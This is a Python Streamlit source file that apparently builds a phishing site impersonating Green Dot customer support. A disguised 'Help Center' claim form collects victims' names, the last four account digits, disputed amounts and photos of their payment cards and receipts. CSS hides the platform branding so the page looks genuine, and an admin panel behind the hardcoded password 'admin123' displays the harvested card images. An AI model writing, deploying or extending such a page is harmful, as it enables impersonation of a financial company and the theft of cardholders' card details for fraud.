
import streamlit as st
import sqlite3
import os
import random
import string
import pandas as pd
from datetime import datetime

# --- DATABASE & FILES ---
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
    conn.commit()
    conn.close()

def generate_ref():
    chars = string.ascii_uppercase + string.digits
    return "GD-" + "".join(random.choice(chars) for _ in range(8))

init_db()

st.set_page_config(page_title="Green Dot | Support", layout="centered", page_icon="✅")

# --- CSS NUCLEAR (RESTORED) ---
st.markdown("""<style>
    [data-testid='stHeader'], [data-testid='stFooterAd'], footer, header, .stDeployButton { 
        display: none !important; visibility: hidden !important; 
    }
    .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
    .stButton>button { 
        background-color: #00a05b !important; color: white !important; 
        width: 100%; border: none !important; font-weight: bold !important;
    }
    .stMarkdown h1, h1 { pointer-events: none !important; cursor: default !important; }
    .block-container { max-width: 550px !important; padding-top: 1rem !important; }
    
    /* Admin styling for internal viewing */
    .stDataFrame { background-color: #111 !important; }
</style>""", unsafe_allow_html=True)

# Sidebar Navigation
menu = st.sidebar.selectbox("Menu", ["Claim Form", "Admin Panel"])

if menu == "Claim Form":
    col1, col2, col3 = st.columns([1,2,1])
    with col2:
        if os.path.exists('logo.svg'):
            st.image('logo.svg', use_container_width=True)

    st.title("Help Center")
    st.write("Please fill out the form below to submit your claim.")

    with st.form("claim_v22_5", clear_on_submit=True):
        nombre = st.text_input("Full Name")
        cuenta = st.text_input("Last 4 digits of Account")
        monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
        st.markdown("**Evidence**")
        rec = st.file_uploader("Receipt Photo", type=['jpg','png','jpeg'])
        car = st.file_uploader("Card Photo", type=['jpg','png','jpeg'])
        submitted = st.form_submit_button("SUBMIT NOW")

    if submitted:
        if nombre and rec and car:
            ref_id = generate_ref()
            f_path = os.path.join(UPLOAD_DIR, f"f_{ref_id}_{rec.name}")
            t_path = os.path.join(UPLOAD_DIR, f"t_{ref_id}_{car.name}")
            with open(f_path, "wb") as f: f.write(rec.getbuffer())
            with open(t_path, "wb") as f: f.write(car.getbuffer())

            conn = sqlite3.connect(DB_NAME)
            c = conn.cursor()
            c.execute("INSERT INTO greendot_submissions (nombre, cuenta, monto, factura_path, tarjeta_path, fecha, ref_id) VALUES (?,?,?,?,?,?,?)",
                      (nombre, cuenta, monto, f_path, t_path, str(datetime.now()), ref_id))
            conn.commit()
            conn.close()

            st.markdown(f"<div style='background:#0e1a10; border:1px solid #00a05b; padding:20px; border-radius:10px; text-align:center;'>" +
                        f"<h2 style='color:#00a05b;'>✅ Claim Submitted</h2><p>Ref: <b>{ref_id}</b></p>" +
                        f"<p style='font-size:12px; color:#888;'>Review in 2-5 business days.</p></div>", unsafe_allow_html=True)
        else:
            st.error("All fields required.")

elif menu == "Admin Panel":
    st.title("🔐 Admin Access")
    pw = st.text_input("Password", type="password")
    if pw == "admin123":
        conn = sqlite3.connect(DB_NAME)
        df = pd.read_sql_query("SELECT * FROM greendot_submissions ORDER BY id DESC", conn)
        conn.close()
        st.dataframe(df)
        for _, row in df.iterrows():
            with st.expander(f"Claim {row['ref_id']}"):
                st.image(row['factura_path'], width=300)
                st.image(row['tarjeta_path'], width=300)
